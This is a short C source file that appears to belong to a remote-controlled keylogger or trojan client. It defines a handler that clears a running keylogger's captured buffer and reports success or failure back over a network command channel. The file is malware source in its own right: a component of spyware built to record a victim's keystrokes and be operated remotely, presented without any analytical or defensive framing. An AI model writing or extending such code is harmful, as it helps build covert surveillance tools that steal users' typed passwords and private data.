#include "types.h"
#include "cmd/commands.h"
#include "net/interface.h"
#include "net/error.h"
#include "keylogger.h"

int command_Keylogger_Clear(void)
{
	if(!keylogger_IsRunning)
	{
		if(net_SendCmd((uint8*)" ", 1, COMMANDS_DISAPPROVE) == NET_LOST_CONNECTION)
		{
			return NET_LOST_CONNECTION;
		}

		return COMMANDS_SUCC;
	}

	keylogger_Clear();

	if(net_SendCmd((uint8*)" ", 1, COMMANDS_APPROVE) == NET_LOST_CONNECTION)
	{
		return NET_LOST_CONNECTION;
	}

	return COMMANDS_SUCC;
}